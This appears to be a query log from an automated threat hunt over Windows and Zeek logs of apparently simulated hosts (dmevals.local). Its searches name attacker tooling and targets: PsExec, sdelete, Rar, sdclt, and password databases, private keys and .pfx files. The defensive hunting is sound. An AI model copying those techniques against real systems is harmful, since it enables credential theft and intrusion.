| q-4a84210348 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKC-"} | None |  |
| q-40b8ac70a9 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOaA_"} | None |  |
| q-d279a5a470 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYiy"} | None |  |
| q-4236881211 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYiy"} | None |  |
| q-ddaf4a3e37 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYiy"} | None |  |
| q-f4843a9f09 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrIjj"} | None |  |
| q-26af38a27d | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrIjj"} | None |  |
| q-f813119400 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-76a9e83b48 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-8472b93f52 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-807ece4374 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRkUVV"} | None |  |
| q-58dea6bab5 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOVAUl3"} | None |  |
| q-4d25d93542 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOVAUl3"} | None |  |
| q-a5d725cfcf | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOVAUl3"} | None |  |
| q-ade69d8c97 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVn1FN5"} | None |  |
| q-12cba21e5b | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVn1FN5"} | None |  |
| q-fc98f27809 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrX8Rl"} | None |  |
| q-c64088ede2 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrX8Rl"} | None |  |
| q-0631a1ef49 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ev8p"} | None |  |
| q-a22db04106 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ev8p"} | None |  |
| q-6584cc009e | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVn1FNc"} | None |  |
| q-b2941a14a8 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None |  |
| q-f57195043b | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None |  |
| q-8f0dd8e6cd | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None |  |
| q-603753cd7a | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRlVDe"} | None |  |
| q-d257a18146 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTkbEF9"} | None |  |
| q-cdc0d4a140 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTkbEGc"} | None |  |
| q-779385cb15 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTvoSAW"} | None |  |
| q-b90be3fffd | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItT2v6oH"} | None |  |
| q-7d64e5c8c0 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItThYt7K"} | None |  |
| q-4ac9ee13a3 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO2iUEp"} | None |  |
| q-91f57a34bc | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrX8Rl"} | None |  |
| q-c0f12a8d09 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ef_w"} | None |  |
| q-34d6f8c0e3 | pivot seed | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1 AND host.name:\"nashua.dmevals.local\"", "time_from": "2020-05-02T02:54:29+00:00", "time_to": "2020-05-02T03:24:29.430000+00:00", "size": 100, "sub_field": "process.parent.exec… | 57 |  |
| q-9bc9c67964 | pivot seed | aggregate | {"dataset": "windows.sysmon", "field": "file.path", "query": "event.code:11 AND host.name:\"nashua.dmevals.local\"", "time_from": "2020-05-02T02:54:29+00:00", "time_to": "2020-05-02T03:24:29.430000+00:00", "size": 100, "sub_field": "process.executable"} | 242 |  |
| q-7c9c9a2859 | pivot seed | aggregate | {"dataset": "windows.security", "field": "process.executable", "query": "event.code:4688 AND host.name:\"nashua.dmevals.local\"", "time_from": "2020-05-02T02:54:29+00:00", "time_to": "2020-05-02T03:24:29.430000+00:00", "size": 100, "sub_field": "process.parent… | 59 |  |
| q-6a1cb4fd7c | pivot seed | aggregate | {"dataset": "windows.powershell", "field": "event.code", "query": "host.name:\"nashua.dmevals.local\"", "time_from": "2020-05-02T02:54:29+00:00", "time_to": "2020-05-02T03:24:29.430000+00:00", "size": 100, "sub_field": null} | 192 |  |
| q-0840c2a33f | pivot seed | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1 AND host.name:\"scranton.dmevals.local\"", "time_from": "2020-05-02T02:40:56.157000+00:00", "time_to": "2020-05-02T03:36:29+00:00", "size": 100, "sub_field": "process.parent.ex… | 359 |  |
| q-86f527e3ea | pivot seed | aggregate | {"dataset": "windows.sysmon", "field": "file.path", "query": "event.code:11 AND host.name:\"scranton.dmevals.local\"", "time_from": "2020-05-02T02:40:56.157000+00:00", "time_to": "2020-05-02T03:36:29+00:00", "size": 100, "sub_field": "process.executable"} | 1276 |  |
| q-0ee28c0d2e | pivot seed | aggregate | {"dataset": "windows.security", "field": "process.executable", "query": "event.code:4688 AND host.name:\"scranton.dmevals.local\"", "time_from": "2020-05-02T02:40:56.157000+00:00", "time_to": "2020-05-02T03:36:29+00:00", "size": 100, "sub_field": "process.pare… | 370 |  |
| q-cc476ea0a9 | pivot seed | aggregate | {"dataset": "windows.powershell", "field": "event.code", "query": "host.name:\"scranton.dmevals.local\"", "time_from": "2020-05-02T02:40:56.157000+00:00", "time_to": "2020-05-02T03:36:29+00:00", "size": 100, "sub_field": null} | 8602 |  |
| q-6b3c44e811 | pivot step 1 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND host.name:\"nashua.dmevals.local\" AND process.executable:\"C:\\\\Windows\\\\Temp\\\\python.exe\"", "time_from": null, "time_to": null, "fields": ["@timestamp", "process.executable", "process.command_lin… | 5 | F63 |
| q-b09fc49429 | pivot step 1 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND host.name:\"nashua.dmevals.local\" AND (process.executable:\"C:\\\\Windows\\\\Temp\\\\Rar.exe\" OR process.executable:\"C:\\\\Windows\\\\Temp\\\\sdelete64.exe\")", "time_from": null, "time_to": null, "fi… | 4 | F62 |
| q-c924a17f33 | pivot step 2 | search | {"dataset": "windows.powershell", "query": "host.name:\"nashua.dmevals.local\" AND event.code:4104", "time_from": null, "time_to": null, "fields": ["@timestamp", "event.code", "powershell.script_block_text", "user.name"], "size": 15, "sort": "asc"} | 11 |  |
| q-34dae71694 | pivot step 2 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND host.name:\"scranton.dmevals.local\" AND (process.executable:\"C:\\\\Program Files\\\\SysinternalsSuite\\\\accessChk.exe\" OR process.executable:\"C:\\\\Program Files\\\\SysinternalsSuite\\\\PsExec64.exe… | 9 | F59 |
| q-f1f7f63215 | pivot step 3 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZLhqPR"} | None |  |
| q-23239e3dc3 | pivot step 3 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZKhUGR"} | None |  |
| q-2cae68b3ac | pivot step 3 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND host.name:\"scranton.dmevals.local\" AND (file.path:*passwordsDB* OR file.path:*.pfx OR file.path:*working.zip OR file.path:*.rar)", "time_from": null, "time_to": null, "fields": ["@timestamp", "file.pa… | 2 | F60, F61 |
| q-bff35a30c8 | pivot step 4 | search | {"dataset": "windows.powershell", "query": "host.name:\"scranton.dmevals.local\" AND event.code:4104", "time_from": null, "time_to": null, "fields": ["@timestamp", "winlog.event_data.ScriptBlockText", "user.name"], "size": 20, "sort": "asc"} | 146 |  |
| q-edbeaec04f | pivot step 4 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND host.name:\"scranton.dmevals.local\" AND (file.path:*0piklvia* OR file.path:*qkbkqqbs* OR file.path:*working.zip OR file.path:*.rar OR file.path:*passwords*)", "time_from": null, "time_to": null, "field… | 19 | F64 |
| q-528335e4a9 | pivot step 5 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZWqdCz"} | None |  |
| q-1763c2ae87 | pivot step 5 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZWqNBi"} | None |  |
| q-531c86d188 | pivot step 5 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZWqdBc"} | None |  |
| q-f322ac3d21 | pivot step 6 | search | {"dataset": "windows.powershell", "query": "host.name:\"scranton.dmevals.local\" AND (winlog.event_data.ScriptBlockText:*PrivateKeys* OR winlog.event_data.ScriptBlockText:*passwordsDB* OR winlog.event_data.ScriptBlockText:*working.zip* OR winlog.event_data.Scr… | 0 |  |
| q-35b04bef30 | pivot step 6 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND host.name:\"scranton.dmevals.local\" AND (file.path:*working.zip* OR file.path:*Desktop* OR file.path:*Downloads*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "file.path", "process.ex… | 317 |  |
| q-30a466a033 | pivot step 7 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND host.name:\"scranton.dmevals.local\" AND file.path:*working.zip*", "time_from": null, "time_to": null, "fields": ["@timestamp", "file.path", "process.executable", "user.name"], "size": 10, "sort": "asc"… | 0 |  |
| q-1e62d815af | pivot step 7 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND host.name:\"scranton.dmevals.local\" AND process.executable:*csc.exe", "time_from": null, "time_to": null, "fields": ["@timestamp", "process.executable", "process.command_line", "process.parent.executabl… | 2 | F64 |
| q-a7febf63f0 | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVGglR"} | None |  |
| q-d39d392740 | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItUGBVXT"} | None |  |
| q-64afa65097 | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTkbkGF"} | None |  |
| q-4aa696da25 | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTkbEF9"} | None |  |
| q-ff69481e12 | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTPA5kN"} | None |  |
| q-08083dd90d | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPO_TIA"} | None |  |
| q-989b9db005 | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPJ5Bh7"} | None |  |
| q-c3da28cceb | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVGQmt"} | None |  |
| q-f5b8785e73 | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVGQmt"} | None |  |
| q-d2043c0db9 | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQA6YzM"} | None |  |
| q-360f5894ee | pivot verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQA6Yzb"} | None |  |
| q-9b6daedd16 | pivot step 9 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND host.name:\"scranton.dmevals.local\" AND process.executable:*cod.3aka3.scr", "time_from": null, "time_to": null, "fields": ["@timestamp", "process.executable", "process.command_line", "process.parent.exe… | 1 | F65 |
| q-b3af6ab0f2 | pivot step 9 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND host.name:\"scranton.dmevals.local\" AND (process.executable:*hostui.exe OR process.executable:*sdclt.exe)", "time_from": null, "time_to": null, "fields": ["@timestamp", "process.executable", "process.co… | 4 | F66, F67 |
| q-beb26402cd | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-6b607aa02b | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-76199b91a3 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItUHCTY0"} | None |  |
| q-510452bf8b | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItUHCTY0"} | None |  |
| q-6709680d65 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTtmJQ5"} | None |  |
| q-94acf85dd6 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO9re0C"} | None |  |
| q-1e395e9ca2 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTiZblD"} | None |  |
| q-9539ed97e8 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO9rO3D"} | None |  |
| q-e6b5c0b536 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO9rO3D"} | None |  |
| q-8ac97ba809 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVn0lP6"} | None |  |
| q-a7ceab5db1 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVn0lP6"} | None |  |
| q-4242d81f6b | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVn0lPQ"} | None |  |
| q-bc1a12691d | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItKT-FUX"} | None |  |
| q-50a6824917 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVGQnT"} | None |  |
| q-440d1717a5 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVGQnT"} | None |  |
| q-df949ef3c8 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOpVKlK"} | None |  |
| q-cf47573abb | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO9re0C"} | None |  |
| q-ade92e1440 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItThYN7M"} | None |  |
| q-d6f5b7c2e4 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPM8kte"} | None |  |
| q-ae53c3a92a | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPM8kte"} | None |  |
| q-ebad45cc85 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPE0PdZ"} | None |  |
| q-eea28b7db9 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVn1FOC"} | None |  |
| q-5f82af8733 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQB61zZ"} | None |  |
| q-4641821f59 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ev9A"} | None |  |
| q-f21ac34282 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPK66ha"} | None |  |
| q-bd976ef1dd | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-a18be39c22 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-09bdfd75e8 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-abea918769 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-10bb24eae4 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-61087309db | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQB61zZ"} | None |  |
| q-420a83a98f | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQB61zZ"} | None |  |
| q-6ca84cac77 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQB61zZ"} | None |  |
| q-26354057e6 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZCgBha"} | None |  |
| q-6d9439eb29 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZCgBha"} | None |  |
| q-dddf958bd1 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZCgBha"} | None |  |
| q-c028910b87 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZCgBha"} | None |  |
| q-da66136d94 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-ace8bde70e | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQB61zZ"} | None |  |
| q-dc16cc73e8 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQB61zZ"} | None |  |
| q-6b5131c78e | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ev8p"} | None |  |
| q-cf2fdc7732 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItV19Rnb"} | None |  |
| q-e783022985 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrX8RS"} | None |  |
| q-c302e93839 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-d24d9fe37e | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-c5927adedb | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ev8p"} | None |  |
| q-d850bdf991 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItV19Rnb"} | None |  |
| q-36b322ac42 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None |  |
| q-1bdf961f39 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPDyDoS"} | None |  |
| q-b58759869d | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ7Ev8p"} | None |  |
| q-1d15b778fe | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVn0lP2"} | None |  |
| q-ae134f2764 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO3jiqC"} | None |  |
| q-588945a4b8 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO9rO3Z"} | None |  |
| q-df06c274ff | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOYDnci"} | None |  |
| q-acab855b19 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVHe6C"} | None |  |
| q-0290661a5a | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVHe6C"} | None |  |
| q-a1cc911940 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVHe6C"} | None |  |
| q-0d932fbe22 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVHe6C"} | None |  |
| q-c1c613dd83 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYgN"} | None |  |
| q-8d6a397204 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYgN"} | None |  |
| q-ba4e9deaa4 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYgN"} | None |  |
| q-e1784f5c59 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrIjx"} | None |  |
| q-d06025ce88 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYjF"} | None |  |
| q-4a8077b0f1 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQE_psP"} | None |  |
| q-3647b73a87 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYih"} | None |  |
| q-c78133d813 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYih"} | None |  |
| q-4cba115b34 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrogj"} | None |  |
| q-81ce6d1234 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYir"} | None |  |
| q-3c906c79a1 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-26c64e18b9 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-c5217b4096 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-a46476ad12 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-fac8dff5b9 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItUHCTY0"} | None |  |
| q-bbe8b7428a | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItUHCTY0"} | None |  |
| q-21c09ce179 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItUHCTY0"} | None |  |
| q-72edcff88b | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKC-"} | None |  |
| q-f46aeed745 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItV3-aVk"} | None |  |
| q-f5244f29f9 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrYiq"} | None |  |
| q-a1d9acd0dd | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ8Frba"} | None |  |
| q-eed17c622b | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ8Frba"} | None |  |
| q-8f7963ad18 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTVHe6C"} | None |  |
| q-bf43a08858 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOVAUl3"} | None |  |
| q-a98de4762c | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOVAUl3"} | None |  |
| q-1969d68cd9 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOVAUmm"} | None |  |
| q-65187b9b27 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOVAUmm"} | None |  |
| q-1bd40ddbbb | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOZEq4k"} | None |  |
| q-2028a02d63 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO9re0C"} | None |  |
| q-08c806ef32 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrog-"} | None |  |
| q-4729429c7f | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrog-"} | None |  |
| q-8ae588ce00 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None |  |
| q-94be2371ca | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None |  |
| q-4582479ac3 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2ML"} | None |  |
| q-a767f616a6 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZLhp5O"} | None |  |
| q-17b58197c6 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZCgBha"} | None |  |
| q-e258316881 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTkbkGF"} | None |  |
| q-8d13c2b6a0 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTkbkGF"} | None |  |
| q-8354b771fb | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZSl2MI"} | None |  |
| q-5b82831a50 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaFQQvB"} | None |  |
| q-dcb19a096c | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaFQQvB"} | None |  |
| q-150121b899 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.17-000001", "id": "AaFHNX1uOFchItbgrog6"} | None |  |
